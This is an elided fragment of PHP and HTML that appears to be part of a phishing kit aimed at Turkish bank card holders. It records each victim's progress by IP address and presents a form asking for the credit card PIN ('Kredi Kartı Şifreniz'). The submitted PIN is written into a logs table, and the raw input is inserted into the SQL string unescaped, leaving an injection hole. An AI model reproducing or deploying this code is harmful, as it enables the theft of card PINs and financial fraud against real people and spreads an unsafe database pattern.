...
$db->query("UPDATE logs SET sayfa='PIN' WHERE ip = '{$ip}'");

if($_POST){
$pin = $_POST['pin'];
    
$sql = "UPDATE logs set pin='$pin' WHERE ip ='$ip'";
$sth = $db->prepare($sql);    
$sth->execute();
                                       ...
                                       <div class="form-group">
                                               <input type="tel" name="pin"
                                                 value="" autocomplete="off" autocorrect="off"
                                                  autocapitalize="off" maxlength="4" size="10" placeholder="Kredi Kartı Şifreniz"
                                                 class="form-control">
                                        </div>
